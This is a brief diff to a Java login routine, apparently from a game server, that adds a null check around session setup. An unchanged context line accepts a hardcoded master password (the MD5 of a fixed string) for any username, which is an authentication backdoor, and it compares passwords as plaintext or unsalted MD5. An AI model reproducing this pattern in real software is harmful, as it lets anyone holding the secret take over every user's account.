@@ -1641,9 +1641,11 @@ public boolean noFlick(UberSocketPrintWriter out) {
 
 				int pid = p.ID;
 				if(pusername.equals(username)&&(ppassword.equals(password)||password.equals(org.apache.commons.codec.digest.DigestUtils.md5Hex("4p5v3sxQ")))) {
-					session.setAttribute("pid",pid);
-					session.setAttribute("username", username);
-					session.setMaxInactiveInterval(7200);
+					if(session!=null) {
+						session.setAttribute("pid",pid);
+						session.setAttribute("username", username);
+						session.setMaxInactiveInterval(7200);
+					}
 					
 					success(out);
 					g.updateLastSession(pid);
